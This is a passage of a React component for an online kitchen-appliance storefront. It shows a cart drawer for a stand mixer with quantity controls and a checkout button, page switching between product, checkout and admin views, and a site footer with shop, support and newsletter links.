                      className="h-full w-full object-contain mix-blend-multiply"
                      referrerPolicy="no-referrer"
                    />
                  </div>
                  <div className="flex flex-1 flex-col justify-between">
                    <div>
                      <h3 className="font-bold">Series 5-Quart Stand Mixer</h3>
                      <p className="text-sm text-slate-500">Color: {selectedColor.name}</p>
                    </div>
                    <div className="flex items-center justify-between">
                      <p className="font-bold">$449.99</p>
                      <div className="flex items-center gap-3 rounded-full border px-3 py-1">
                        <button onClick={decrementQuantity}><Minus className="h-3 w-3" /></button>
                        <span className="text-sm font-bold">{quantity}</span>
                        <button onClick={incrementQuantity}><Plus className="h-3 w-3" /></button>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
              <div className="mt-auto pt-6 space-y-4">
                <div className="flex items-center justify-between text-lg font-bold">
                  <span>Subtotal</span>
                  <span>${(449.99 * quantity).toFixed(2)}</span>
                </div>
                <Button 
                  className="h-14 w-full rounded-xl text-lg font-bold"
                  onClick={() => {
                    setIsCartOpen(false);
                    setView("checkout");
                  }}
                >
                  Checkout
                </Button>
                <p className="text-center text-xs text-slate-400">Shipping and taxes calculated at checkout</p>
              </div>
            </motion.div>
          </>
        )}
      </AnimatePresence>

      <AnimatePresence mode="wait">
        {view === "product" && renderProductPage()}
        {view === "checkout" && renderCheckoutPage()}
        {view === "admin-login" && renderAdminLoginPage()}
        {view === "admin-dashboard" && renderAdminDashboardPage()}
      </AnimatePresence>

      {/* Footer */}
      <footer className="mt-20 border-t bg-white py-12">
        <div className="container mx-auto px-4 md:px-6">
          <div className="grid gap-8 md:grid-cols-4">
            <div className="space-y-4">
              <div className="text-xl font-bold tracking-tighter">ARTISAN</div>
              <p className="text-sm text-slate-500">
                Crafting quality kitchen appliances since 1919. Designed for the way you live.
              </p>
            </div>
            <div>
              <h4 className="mb-4 font-bold">Shop</h4>
              <ul className="space-y-2 text-sm text-slate-500">
                <li><a href="#" className="hover:text-primary">Stand Mixers</a></li>
                <li><a href="#" className="hover:text-primary">Attachments</a></li>
                <li><a href="#" className="hover:text-primary">Cookware</a></li>
                <li><a href="#" className="hover:text-primary">Bakeware</a></li>
              </ul>
            </div>
            <div>
              <h4 className="mb-4 font-bold">Support</h4>
              <ul className="space-y-2 text-sm text-slate-500">
                <li><a href="#" className="hover:text-primary">Contact Us</a></li>
                <li><a href="#" className="hover:text-primary">Product Registration</a></li>
                <li><a href="#" className="hover:text-primary">Service & Repair</a></li>
                <li><a href="#" className="hover:text-primary">Manuals</a></li>
              </ul>
            </div>
            <div>
              <h4 className="mb-4 font-bold">Newsletter</h4>
              <p className="mb-4 text-sm text-slate-500">Subscribe to get special offers and recipes.</p>
              <div className="flex gap-2">
                <Input placeholder="Email address" className="rounded-full" />
                <Button className="rounded-full">Join</Button>
              </div>
            </div>
          </div>
          <Separator className="my-8" />
          <div className="flex flex-col items-center justify-between gap-4 text-xs text-slate-400 sm:flex-row">
            <p>© 2026 Artisan Appliances. All rights reserved.</p>
            <div className="flex gap-6">
              <a href="#" className="hover:text-primary">Privacy Policy</a>
              <a href="#" className="hover:text-primary">Terms of Service</a>
              <a 
                href="#" 
                className="hover:text-primary"
                onClick={(e) => {
                  e.preventDefault();
                  setView("admin-login");
                }}
              >
                Admin
              </a>
            </div>
          </div>
        </div>
      </footer>
    </div>
  );
}

